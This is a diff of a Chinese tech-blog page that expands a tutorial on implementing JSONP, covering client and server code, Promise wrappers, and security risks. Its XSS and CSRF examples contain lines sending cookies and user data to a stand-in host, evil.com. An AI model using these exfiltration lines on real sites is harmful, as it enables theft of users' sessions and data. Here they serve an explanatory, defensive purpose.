@@ -1,17 +1,18 @@
-<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>实现JSONP | 夜星的技术博客</title><meta name="author" content="夜星"><meta name="copyright" content="夜星"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="最近再看手写 API 的面经，也手写了很多原生的 API，比如深拷贝，Promise，今天突然看到了一个 JSONP，之前完全没有了解过，不过再看牛客的面经的时候发现还挺多公司问的，就来了解一下。 JSONP 是什么JSONP 全称：JSON with Padding，是一种解决跨域问题的技术，这项技术的核心思想是通过在页面动态创建 script 标签，从另一个域加载包含 JSON 数据的外部脚步">
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><!-- hexo injector head_begin start --><script>window.CUSTOM_POST_COUNT = 2;</script><!-- hexo injector head_begin end --><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>JSONP跨域解决方案详解：原理、实现与安全实践 | 夜星的技术博客</title><meta name="author" content="夜星"><meta name="copyright" content="夜星"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言：为什么需要 JSONP在前端开发中，跨域是一个常见的问题。由于浏览器的同源策略（Same-Origin Policy），不同源之间的 AJAX 请求会受到限制。在 CORS（跨域资源共享）标准普及之前，JSONP 是最流行的跨域解决方案之一。 虽然现代开发中 CORS 已经成为主流，但 JSONP 仍然出现在很多面试题中，理解其原理对于前端工程师来说非常重要。本文将深入讲解 JSONP 的原">
 <meta property="og:type" content="article">
-<meta property="og:title" content="实现JSONP">
+<meta property="og:title" content="JSONP跨域解决方案详解：原理、实现与安全实践">
 <meta property="og:url" content="http://example.com/posts/handwrite-jsonp/index.html">
 <meta property="og:site_name" content="夜星的技术博客">
-<meta property="og:description" content="最近再看手写 API 的面经，也手写了很多原生的 API，比如深拷贝，Promise，今天突然看到了一个 JSONP，之前完全没有了解过，不过再看牛客的面经的时候发现还挺多公司问的，就来了解一下。 JSONP 是什么JSONP 全称：JSON with Padding，是一种解决跨域问题的技术，这项技术的核心思想是通过在页面动态创建 script 标签，从另一个域加载包含 JSON 数据的外部脚步">
+<meta property="og:description" content="前言：为什么需要 JSONP在前端开发中，跨域是一个常见的问题。由于浏览器的同源策略（Same-Origin Policy），不同源之间的 AJAX 请求会受到限制。在 CORS（跨域资源共享）标准普及之前，JSONP 是最流行的跨域解决方案之一。 虽然现代开发中 CORS 已经成为主流，但 JSONP 仍然出现在很多面试题中，理解其原理对于前端工程师来说非常重要。本文将深入讲解 JSONP 的原">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/img/avator.jpg">
 <meta property="article:published_time" content="2023-12-22T16:00:00.000Z">
-<meta property="article:modified_time" content="2026-03-14T01:25:58.424Z">
+<meta property="article:modified_time" content="2026-03-18T14:10:23.109Z">
 <meta property="article:author" content="夜星">
 <meta property="article:tag" content="JavaScript">
 <meta property="article:tag" content="手写API">
 <meta property="article:tag" content="跨域">
+<meta property="article:tag" content="JSONP">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/img/avator.jpg"><link rel="shortcut icon" href="/img/icon_favicon.jpeg"><link rel="canonical" href="http://example.com/posts/handwrite-jsonp/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
   root: '/',
@@ -55,12 +56,12 @@
   },
   autoDarkmode: false
 }</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
-  title: '实现JSONP',
+  title: 'JSONP跨域解决方案详解：原理、实现与安全实践',
   isPost: true,
   isHome: false,
   isHighlightShrink: false,
   isToc: true,
-  postUpdate: '2026-03-14 09:25:58'
+  postUpdate: '2026 22:10:23'
 }</script><noscript><style type="text/css">
   #nav {
     opacity: 1
@@ -164,80 +165,681 @@
       }
     }
     detectApple()
-    })(window)</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/loading.gif" data-original="/img/avator.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">64</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-th"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="夜星的技术博客"><span class="site-name">夜星的技术博客</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-th"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">实现JSONP</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-12-22T16:00:00.000Z" title="发表于 2023-12-23 00:00:00">2023-12-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-03-14T01:25:58.424Z" title="更新于 2026-03-14 09:25:58">2026-03-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/frontend-basics/">前端基础</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">569</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>2分钟</span></span></div></div></div><article class="post-content" id="article-container"><p>最近再看手写 API 的面经，也手写了很多原生的 API，比如深拷贝，Promise，今天突然看到了一个 JSONP，之前完全没有了解过，不过再看牛客的面经的时候发现还挺多公司问的，就来了解一下。</p>
-<h2 id="JSONP-是什么"><a href="#JSONP-是什么" class="headerlink" title="JSONP 是什么"></a>JSONP 是什么</h2><p>JSONP 全称：JSON with Padding，是一种解决跨域问题的技术，这项技术的核心思想是通过在页面动态创建 script 标签，从另一个域加载包含 JSON 数据的外部脚步，然后将数据包裹在一个函数调用中返回给客户端，虽然能解决跨域，但是它只能进行 get 请求</p>
-<h2 id="JSONP-原理"><a href="#JSONP-原理" class="headerlink" title="JSONP 原理"></a>JSONP 原理</h2><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><pre><code class="html">&lt;!DOCTYPE html&gt;
+    })(window)</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/loading.gif" data-original="/img/avator.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">129</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-th"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="夜星的技术博客"><span class="site-name">夜星的技术博客</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-th"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">JSONP跨域解决方案详解：原理、实现与安全实践</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-12-22T16:00:00.000Z" title="发表于 2023 00:00:00">2023</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-03-18T14:10:23.109Z" title="更新于 2026 22:10:23">2026</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/frontend-basics/">前端基础</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>15分钟</span></span></div></div></div><article class="post-content" id="article-container"><h2 id="前言：为什么需要-JSONP"><a href="#前言：为什么需要-JSONP" class="headerlink" title="前言：为什么需要 JSONP"></a>前言：为什么需要 JSONP</h2><p>在前端开发中，跨域是一个常见的问题。由于浏览器的<strong>同源策略</strong>（Same-Origin Policy），不同源之间的 AJAX 请求会受到限制。在 CORS（跨域资源共享）标准普及之前，JSONP 是最流行的跨域解决方案之一。</p>
+<p>虽然现代开发中 CORS 已经成为主流，但 JSONP 仍然出现在很多面试题中，理解其原理对于前端工程师来说非常重要。本文将深入讲解 JSONP 的原理、实现方式以及安全性问题。</p>
+<h2 id="一、JSONP-是什么"><a href="#一、JSONP-是什么" class="headerlink" title="一、JSONP 是什么"></a>一、JSONP 是什么</h2><p>JSONP（JSON with Padding）是一种绕过同源策略实现跨域请求的技术。其核心思想是：</p>
+<ul>
+<li>利用 <code>&lt;script&gt;</code> 标签不受同源策略限制的特性</li>
+<li>动态创建 script 标签请求跨域数据</li>
+<li>服务器返回的不再是纯 JSON 数据，而是将 JSON 数据作为参数传递给回调函数</li>
+<li>前端预先定义好回调函数来接收数据</li>
+</ul>
+<p><strong>关键点</strong>：JSONP 只支持 GET 请求，因为 script 标签只能发送 GET 请求</p>
+<h2 id="二、JSONP-原理详解"><a href="#二、JSONP-原理详解" class="headerlink" title="二、JSONP 原理详解"></a>二、JSONP 原理详解</h2><h3 id="2-1-同源策略与-script-标签"><a href="#2-1-同源策略与-script-标签" class="headerlink" title="2.1 同源策略与 script 标签"></a>2.1 同源策略与 script 标签</h3><p>浏览器的同源策略限制了：</p>
+<ul>
+<li>AJAX 请求（XMLHttpRequest、Fetch）</li>
+<li>DOM 操作</li>
+<li>Cookie、LocalStorage、IndexedDB</li>
+</ul>
+<p>但以下标签不受同源策略限制：</p>
+<ul>
+<li><code>&lt;script src=&quot;...&quot;&gt;</code></li>
+<li><code>&lt;img src=&quot;...&quot;&gt;</code></li>
+<li><code>&lt;link href=&quot;...&quot;&gt;</code></li>
+<li><code>&lt;iframe src=&quot;...&quot;&gt;</code></li>
+</ul>
+<p>JSONP 正是利用了 <code>&lt;script&gt;</code> 标签可以跨域加载脚本的特性。</p>
+<h3 id="2-2-工作流程"><a href="#2-2-工作流程" class="headerlink" title="2.2 工作流程"></a>2.2 工作流程</h3><pre><code>客户端                                服务器
+  │                                    │
+  ├─ 1. 定义回调函数 callback()         │
+  ├─ 2. 创建 &lt;script&gt; 标签              │
+  ├─ 3. 设置 src=&quot;url?callback=fn&quot; ───→ │
+  │                                    ├─ 4. 接收请求，获取 callback 参数
+  │                                    ├─ 5. 返回 &quot;callback(data)&quot;
+  │ ←───────────────────────────────────┤
+  ├─ 6. script 标签加载完成             │
+  ├─ 7. 自动执行 callback(data)         │
+  └─ 8. 获得数据                        │
+</code></pre>
+<h3 id="2-3-简单示例"><a href="#2-3-简单示例" class="headerlink" title="2.3 简单示例"></a>2.3 简单示例</h3><pre><code class="html">&lt;!DOCTYPE html&gt;
 &lt;html lang=&quot;en&quot;&gt;
-  &lt;head&gt;
-    &lt;meta charset=&quot;UTF-8&quot; /&gt;
-    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot; /&gt;
-    &lt;title&gt;JSONP Example&lt;/title&gt;
-  &lt;/head&gt;
-  &lt;body&gt;
-    &lt;h1&gt;JSONP Example&lt;/h1&gt;
-    &lt;div id=&quot;result&quot;&gt;&lt;/div&gt;
+&lt;head&gt;
+  &lt;meta charset=&quot;UTF-8&quot; /&gt;
+  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot; /&gt;
+  &lt;title&gt;JSONP 基础示例&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;h1&gt;JSONP 基础示例&lt;/h1&gt;
+  &lt;div id=&quot;result&quot;&gt;&lt;/div&gt;
 
-    &lt;script&gt;
-      // 定义JSONP回调函数
-      function callback(data) &#123;
-        const resultDiv = document.getElementById(&quot;result&quot;);
-        resultDiv.innerHTML = `Name: $&#123;data.name&#125;, Age: $&#123;data.age&#125;`;
-      &#125;
+  &lt;script&gt;
+    // 1. 定义回调函数
+    function handleData(data) &#123;
+      console.log(&#39;收到数据:&#39;, data);
+      const resultDiv = document.getElementById(&quot;result&quot;);
+      resultDiv.innerHTML = `Name: $&#123;data.name&#125;, Age: $&#123;data.age&#125;`;
+    &#125;
 
-      // 创建JSONP请求
-      const script = document.createElement(&quot;script&quot;);
-      // 这里callback传递了一个callback参数，目的是让后端知道调用该前端函数，并把数据传递过来
-      script.src = &quot;http://localhost:3000/data?callback=callback&quot;;
-      document.body.appendChild(script);
-    &lt;/script&gt;
-  &lt;/body&gt;
+    // 2. 创建 script 标签
+    const script = document.createElement(&quot;script&quot;);
+    
+    // 3. 设置请求 URL，传递回调函数名
+    // 服务器会根据 callback 参数返回 handleData(data)
+    script.src = &quot;http://localhost:3000/api/data?callback=handleData&quot;;
+    
+    // 4. 插入到 DOM 中触发请求
+    document.body.appendChild(script);
+    
+    // 5. 请求完成后删除 script 标签（可选）
+    script.onload = function() &#123;
+      document.body.removeChild(script);
+    &#125;;
+  &lt;/script&gt;
+&lt;/body&gt;
 &lt;/html&gt;
 </code></pre>
-<h3 id="服务器端"><a href="#服务器端" class="headerlink" title="服务器端"></a>服务器端</h3><pre><code class="javascript">const Koa = require(&quot;koa&quot;);
+<h3 id="服务器端实现（Node-js）"><a href="#服务器端实现（Node-js）" class="headerlink" title="服务器端实现（Node.js）"></a>服务器端实现（Node.js）</h3><pre><code class="javascript">const Koa = require(&quot;koa&quot;);
 const Router = require(&quot;koa-router&quot;);
 
 const app = new Koa();
 const router = new Router();
 
-// 定义一个简单的JSON数据
+// 模拟数据
 const jsonData = &#123;
   name: &quot;John&quot;,
   age: 30,
+  city: &quot;New York&quot;
 &#125;;
 
-// 添加路由处理JSONP请求
-router.get(&quot;/data&quot;, (ctx) =&gt; &#123;
+// JSONP 接口
+router.get(&quot;/api/data&quot;, (ctx) =&gt; &#123;
   const callback = ctx.query.callback;
+  
   if (callback) &#123;
-    // 执行前端指定的函数回调，并把数据传递过去
+    // 设置响应类型为 JavaScript
+    ctx.type = &#39;application/javascript&#39;;
+    // 返回：handleData(&#123;&quot;name&quot;:&quot;John&quot;,&quot;age&quot;:30,&quot;city&quot;:&quot;New York&quot;&#125;)
     ctx.body = `$&#123;callback&#125;($&#123;JSON.stringify(jsonData)&#125;)`;
   &#125; else &#123;
+    // 没有 callback 参数，返回普通 JSON
     ctx.body = jsonData;
   &#125;
 &#125;);
 
-// 将路由注册到Koa应用程序
 app.use(router.routes()).use(router.allowedMethods());
 
-// 启动Koa应用程序
 const port = 3000;
 app.listen(port, () =&gt; &#123;
-  console.log(`Server is running on port $&#123;port&#125;`);
+  console.log(`Server is running on http://localhost:$&#123;port&#125;`);
 &#125;);
 </code></pre>
-<p>这样我们就实现了 JSONP 但是我们还要注意一些事项</p>
-<h2 id="JSONP-优缺点"><a href="#JSONP-优缺点" class="headerlink" title="JSONP 优缺点"></a>JSONP 优缺点</h2><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><ul>
-<li>简单易用</li>
-<li>浏览器几乎都支持</li>
-<li>可以请求跨域请求</li>
+<p><strong>关键点解析</strong>：</p>
+<ol>
+<li><strong>前端定义回调函数</strong>：<code>handleData</code> 用于接收服务器返回的数据</li>
+<li><strong>传递回调函数名</strong>：通过 URL 参数 <code>callback=handleData</code> 告诉服务器</li>
+<li><strong>服务器返回函数调用</strong>：<code>handleData(&#123;&quot;name&quot;:&quot;John&quot;,...&#125;)</code></li>
+<li><strong>自动执行</strong>：script 标签加载后自动执行返回的代码</li>
+</ol>
+<h2 id="三、手写-JSONP-封装函数"><a href="#三、手写-JSONP-封装函数" class="headerlink" title="三、手写 JSONP 封装函数"></a>三、手写 JSONP 封装函数</h2><p>上面的例子是最基础的实现。实际开发中，我们需要封装一个更完善的 JSONP 函数：</p>
+<h3 id="3-1-基础版本"><a href="#3-1-基础版本" class="headerlink" title="3.1 基础版本"></a>3.1 基础版本</h3><pre><code class="javascript">function jsonp(url, callback = &#39;callback&#39;) &#123;
+  return new Promise((resolve, reject) =&gt; &#123;
+    // 1. 创建全局回调函数
+    const callbackName = `jsonp_callback_$&#123;Date.now()&#125;_$&#123;Math.random().toString(36).substr(2)&#125;`;
+    
+    window[callbackName] = function(data) &#123;
+      resolve(data);
+      // 清理全局函数
+      delete window[callbackName];
+    &#125;;
+    
+    // 2. 创建 script 标签
+    const script = document.createElement(&#39;script&#39;);
+    
+    // 3. 处理 URL
+    const separator = url.includes(&#39;?&#39;) ? &#39;&amp;&#39; : &#39;?&#39;;
+    script.src = `$&#123;url&#125;$&#123;separator&#125;$&#123;callback&#125;=$&#123;callbackName&#125;`;
+    
+    // 4. 错误处理
+    script.onerror = function() &#123;
+      reject(new Error(&#39;JSONP 请求失败&#39;));
+      delete window[callbackName];
+      document.body.removeChild(script);
+    &#125;;
+    
+    // 5. 插入 DOM
+    document.body.appendChild(script);
+    
+    // 6. 加载完成后移除 script 标签
+    script.onload = function() &#123;
+      document.body.removeChild(script);
+    &#125;;
+  &#125;);
+&#125;
+
+// 使用示例
+jsonp(&#39;http://localhost:3000/api/data&#39;)
+  .then(data =&gt; console.log(data))
+  .catch(err =&gt; console.error(err));
+</code></pre>
+<h3 id="3-2-完整版本（支持配置和超时）"><a href="#3-2-完整版本（支持配置和超时）" class="headerlink" title="3.2 完整版本（支持配置和超时）"></a>3.2 完整版本（支持配置和超时）</h3><pre><code class="javascript">function jsonp(options) &#123;
+  const &#123;
+    url,
+    data = &#123;&#125;,           // 请求参数
+    callback = &#39;callback&#39;, // 回调参数名
+    timeout = 10000      // 超时时间
+  &#125; = options;
+  
+  return new Promise((resolve, reject) =&gt; &#123;
+    // 1. 生成唯一的回调函数名
+    const callbackName = `jsonp_$&#123;Date.now()&#125;_$&#123;Math.random().toString(36).substr(2, 5)&#125;`;
+    
+    // 2. 创建全局回调函数
+    window[callbackName] = function(responseData) &#123;
+      resolve(responseData);
+      cleanup();
+    &#125;;
+    
+    // 3. 构建请求 URL
+    const query = Object.keys(data)
+      .map(key =&gt; `$&#123;encodeURIComponent(key)&#125;=$&#123;encodeURIComponent(data[key])&#125;`)
+      .join(&#39;&amp;&#39;);
+    
+    const separator = url.includes(&#39;?&#39;) ? &#39;&amp;&#39; : &#39;?&#39;;
+    const requestUrl = `$&#123;url&#125;$&#123;separator&#125;$&#123;callback&#125;=$&#123;callbackName&#125;&amp;$&#123;query&#125;`;
+    
+    // 4. 创建 script 标签
+    const script = document.createElement(&#39;script&#39;);
+    script.src = requestUrl;
+    
+    // 5. 超时处理
+    const timer = setTimeout(() =&gt; &#123;
+      reject(new Error(`JSONP 请求超时（$&#123;timeout&#125;ms）`));
+      cleanup();
+    &#125;, timeout);
+    
+    // 6. 错误处理
+    script.onerror = function() &#123;
+      reject(new Error(&#39;JSONP 请求失败&#39;));
+      cleanup();
+    &#125;;
+    
+    // 7. 清理函数
+    function cleanup() &#123;
+      clearTimeout(timer);
+      delete window[callbackName];
+      if (script.parentNode) &#123;
+        document.body.removeChild(script);
+      &#125;
+    &#125;
+    
+    // 8. 发起请求
+    document.body.appendChild(script);
+  &#125;);
+&#125;
+
+// 使用示例
+jsonp(&#123;
+  url: &#39;http://localhost:3000/api/user&#39;,
+  data: &#123;
+    id: 123,
+    name: &#39;John&#39;
+  &#125;,
+  callback: &#39;callback&#39;,
+  timeout: 5000
+&#125;)
+  .then(data =&gt; &#123;
+    console.log(&#39;请求成功:&#39;, data);
+  &#125;)
+  .catch(err =&gt; &#123;
+    console.error(&#39;请求失败:&#39;, err.message);
+  &#125;);
+</code></pre>
+<h3 id="3-3-支持取消的版本"><a href="#3-3-支持取消的版本" class="headerlink" title="3.3 支持取消的版本"></a>3.3 支持取消的版本</h3><pre><code class="javascript">function jsonpWithCancel(options) &#123;
+  const &#123;
+    url,
+    data = &#123;&#125;,
+    callback = &#39;callback&#39;,
+    timeout = 10000
+  &#125; = options;
+  
+  let cancelled = false;
+  let cleanup = null;
+  
+  const promise = new Promise((resolve, reject) =&gt; &#123;
+    const callbackName = `jsonp_$&#123;Date.now()&#125;_$&#123;Math.random().toString(36).substr(2, 5)&#125;`;
+    
+    window[callbackName] = function(responseData) &#123;
+      if (!cancelled) &#123;
+        resolve(responseData);
+      &#125;
+      cleanup &amp;&amp; cleanup();
+    &#125;;
+    
+    const query = Object.keys(data)
+      .map(key =&gt; `$&#123;encodeURIComponent(key)&#125;=$&#123;encodeURIComponent(data[key])&#125;`)
+      .join(&#39;&amp;&#39;);
+    
+    const separator = url.includes(&#39;?&#39;) ? &#39;&amp;&#39; : &#39;?&#39;;
+    const requestUrl = `$&#123;url&#125;$&#123;separator&#125;$&#123;callback&#125;=$&#123;callbackName&#125;&amp;$&#123;query&#125;`;
+    
+    const script = document.createElement(&#39;script&#39;);
+    script.src = requestUrl;
+    
+    const timer = setTimeout(() =&gt; &#123;
+      if (!cancelled) &#123;
+        reject(new Error(`JSONP 请求超时`));
+      &#125;
+      cleanup &amp;&amp; cleanup();
+    &#125;, timeout);
+    
+    script.onerror = function() &#123;
+      if (!cancelled) &#123;
+        reject(new Error(&#39;JSONP 请求失败&#39;));
+      &#125;
+      cleanup &amp;&amp; cleanup();
+    &#125;;
+    
+    cleanup = function() &#123;
+      clearTimeout(timer);
+      delete window[callbackName];
+      if (script.parentNode) &#123;
+        document.body.removeChild(script);
+      &#125;
+    &#125;;
+    
+    document.body.appendChild(script);
+  &#125;);
+  
+  // 返回 promise 和取消函数
+  return &#123;
+    promise,
+    cancel: function() &#123;
+      cancelled = true;
+      cleanup &amp;&amp; cleanup();
+    &#125;
+  &#125;;
+&#125;
+
+// 使用示例
+const &#123; promise, cancel &#125; = jsonpWithCancel(&#123;
+  url: &#39;http://localhost:3000/api/data&#39;,
+  timeout: 10000
+&#125;);
+
+promise
+  .then(data =&gt; console.log(data))
+  .catch(err =&gt; console.error(err));
+
+// 5秒后取消请求
+setTimeout(() =&gt; &#123;
+  cancel();
+  console.log(&#39;请求已取消&#39;);
+&#125;, 5000);
+</code></pre>
+<h2 id="四、JSONP-优缺点分析"><a href="#四、JSONP-优缺点分析" class="headerlink" title="四、JSONP 优缺点分析"></a>四、JSONP 优缺点分析</h2><h3 id="4-1-优点"><a href="#4-1-优点" class="headerlink" title="4.1 优点"></a>4.1 优点</h3><table>
+<thead>
+<tr>
+<th>优点</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>✅ 兼容性好</td>
+<td>支持所有浏览器，包括 IE6+</td>
+</tr>
+<tr>
+<td>✅ 实现简单</td>
+<td>无需服务器特殊配置（CORS 需要设置响应头）</td>
+</tr>
+<tr>
+<td>✅ 跨域支持</td>
+<td>完美绕过同源策略</td>
+</tr>
+<tr>
+<td>✅ 轻量级</td>
+<td>不依赖额外的库</td>
+</tr>
+</tbody></table>
+<h3 id="4-2-缺点"><a href="#4-2-缺点" class="headerlink" title="4.2 缺点"></a>4.2 缺点</h3><table>
+<thead>
+<tr>
+<th>缺点</th>
+<th>说明</th>
+<th>风险等级</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>❌ 仅支持 GET</td>
+<td>无法发送 POST、PUT 等请求</td>
+<td>中</td>
+</tr>
+<tr>
+<td>❌ XSS 风险</td>
+<td>服务器返回的代码会被直接执行</td>
+<td>🔴 高</td>
+</tr>
+<tr>
+<td>❌ CSRF 攻击</td>
+<td>容易被恶意网站利用</td>
+<td>🔴 高</td>
+</tr>
+<tr>
+<td>❌ 错误处理困难</td>
+<td>无法获取 HTTP 状态码</td>
+<td>中</td>
+</tr>
+<tr>
+<td>❌ 无法设置请求头</td>
+<td>不能自定义 Content-Type 等</td>
+<td>低</td>
+</tr>
+<tr>
+<td>❌ 超时控制复杂</td>
+<td>需要手动实现超时机制</td>
+<td>低</td>
+</tr>
+</tbody></table>
+<h2 id="五、安全性问题详解"><a href="#五、安全性问题详解" class="headerlink" title="五、安全性问题详解"></a>五、安全性问题详解</h2><h3 id="5-1-XSS-攻击风险"><a href="#5-1-XSS-攻击风险" class="headerlink" title="5.1 XSS 攻击风险"></a>5.1 XSS 攻击风险</h3><p><strong>问题</strong>：JSONP 返回的是可执行的 JavaScript 代码，如果服务器被攻击或数据源不可信，可能注入恶意代码。</p>
+<p><strong>示例攻击场景</strong>：</p>
+<pre><code class="javascript">// 恶意服务器返回：
+callbackFunction(
+  // 正常数据
+  &#123;name: &#39;John&#39;, age: 30&#125;
+);
+// 恶意代码
+document.cookie = &#39;session=stolen&#39;; // 窃取 Cookie
+new Image().src = &#39;http://evil.com?cookie=&#39; + document.cookie;
+</code></pre>
+<p><strong>防御措施</strong>：</p>
+<ol>
+<li><strong>数据验证</strong>：服务器端过滤危险字符</li>
+</ol>
+<pre><code class="javascript">// 服务器端示例
+router.get(&#39;/api/data&#39;, (ctx) =&gt; &#123;
+  const callback = ctx.query.callback;
+  
+  // 验证回调函数名是否合法（只允许字母、数字、下划线）
+  if (!/^[a-zA-Z_][a-zA-Z0-9_]*$/.test(callback)) &#123;
+    ctx.status = 400;
+    ctx.body = &#39;Invalid callback name&#39;;
+    return;
+  &#125;
+  
+  ctx.type = &#39;application/javascript&#39;;
+  ctx.body = `$&#123;callback&#125;($&#123;JSON.stringify(jsonData)&#125;)`;
+&#125;);
+</code></pre>
+<ol start="2">
+<li><strong>Referer 检查</strong>：验证请求来源</li>
+</ol>
+<pre><code class="javascript">// 服务器端检查
+router.get(&#39;/api/data&#39;, (ctx) =&gt; &#123;
+  const referer = ctx.headers.referer || &#39;&#39;;
+  
+  // 只允许特定域名访问
+  const allowedDomains = [&#39;http://localhost:3000&#39;, &#39;https://mysite.com&#39;];
+  const isAllowed = allowedDomains.some(domain =&gt; referer.startsWith(domain));
+  
+  if (!isAllowed) &#123;
+    ctx.status = 403;
+    ctx.body = &#39;Forbidden&#39;;
+    return;
+  &#125;
+  
+  // 处理 JSONP 请求
+  // ...
+&#125;);
+</code></pre>
+<h3 id="5-2-CSRF-攻击风险"><a href="#5-2-CSRF-攻击风险" class="headerlink" title="5.2 CSRF 攻击风险"></a>5.2 CSRF 攻击风险</h3><p><strong>问题</strong>：恶意网站可以调用你的 JSONP 接口获取用户敏感数据。</p>
+<p><strong>攻击示例</strong>：</p>
+<pre><code class="html">&lt;!-- 恶意网站 evil.com --&gt;
+&lt;script&gt;
+  function stealData(data) &#123;
+    // 将用户数据发送到攻击者服务器
+    new Image().src = &#39;http://evil.com/steal?data=&#39; + JSON.stringify(data);
+  &#125;
+&lt;/script&gt;
